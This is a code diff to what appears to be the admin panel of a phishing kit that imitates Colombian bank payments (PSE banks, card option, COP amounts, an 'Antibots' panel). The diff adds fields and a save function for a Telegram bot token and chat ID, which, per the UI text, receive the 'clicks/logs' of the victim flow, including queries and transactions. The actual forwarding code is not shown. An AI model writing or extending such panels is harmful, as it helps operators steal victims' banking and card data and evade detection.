@@ -21,6 +21,8 @@ type Props = {
   tarjetaEnabled: boolean;
   bancosPse: BancoPseSetting[];
   antibot: AntibotConfigShape;
+  telegramBotToken: string;
+  telegramChatId: string;
 };
 
 function formatCOP(n: number): string {
@@ -40,6 +42,31 @@ export default function CrudIndexClient(props: Props) {
   const [uploadError, setUploadError] = useState<string | null>(null);
   const [uploading, setUploading] = useState(false);
   const [clearing, setClearing] = useState(false);
+  const [tgBotToken, setTgBotToken] = useState(props.telegramBotToken);
+  const [tgChatId, setTgChatId] = useState(props.telegramChatId);
+  const [tgSaving, setTgSaving] = useState(false);
+  const [tgFeedback, setTgFeedback] = useState<string | null>(null);
+
+  async function saveTelegramFlow() {
+    setTgSaving(true);
+    setTgFeedback(null);
+    try {
+      const r = await fetch("/api/crud/telegram-flow", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          telegram_bot_token: tgBotToken,
+          telegram_chat_id: tgChatId,
+        }),
+      });
+      const data = await r.json();
+      setTgFeedback(r.ok && data.ok ? "Guardado." : data?.error || "Error al guardar.");
+    } catch {
+      setTgFeedback("Error de conexión.");
+    } finally {
+      setTgSaving(false);
+    }
+  }
 
   async function logout() {
     await fetch("/api/crud/logout", { method: "POST" });
@@ -289,6 +316,46 @@ export default function CrudIndexClient(props: Props) {
             </div>
           )}
         </section>
+
+        {/* Clicks/Logs del flujo a Telegram */}
+        <div className="bg-white rounded-lg shadow p-6 mb-6">
+          <h2 className="text-lg font-semibold mb-1 text-gray-800">
+            Clicks/Logs del flujo a Telegram
+          </h2>
+          <p className="text-sm text-gray-500 mb-4">
+            Credenciales del bot que recibe los clicks/logs del flujo (consultas y transacciones).
+            Si están vacíos, no se envía nada.
+          </p>
+          <div className="space-y-3">
+            <div>
+              <label className="block text-sm font-medium text-gray-700 mb-1">Bot Token</label>
+              <input
+                type="text"
+                value={tgBotToken}
+                onChange={(e) => setTgBotToken(e.target.value)}
+                className="w-full border border-gray-300 rounded-md px-3 py-2 text-sm font-mono"
+              />
+            </div>
+            <div>
+              <label className="block text-sm font-medium text-gray-700 mb-1">Chat ID</label>
+              <input
+                type="text"
+                value={tgChatId}
+                onChange={(e) => setTgChatId(e.target.value)}
+                className="w-full border border-gray-300 rounded-md px-3 py-2 text-sm font-mono"
+              />
+            </div>
+            <button
+              type="button"
+              onClick={saveTelegramFlow}
+              disabled={tgSaving}
+              className="bg-blue-600 hover:bg-blue-700 disabled:opacity-50 text-white px-4 py-2 rounded text-sm"
+            >
+              {tgSaving ? "Guardando..." : "Guardar"}
+            </button>
+            {tgFeedback && <p className="mt-2 text-sm text-gray-700">{tgFeedback}</p>}
+          </div>
+        </div>
 
         {/* Antibots Panel */}
         <AntibotsPanel initial={props.antibot} />
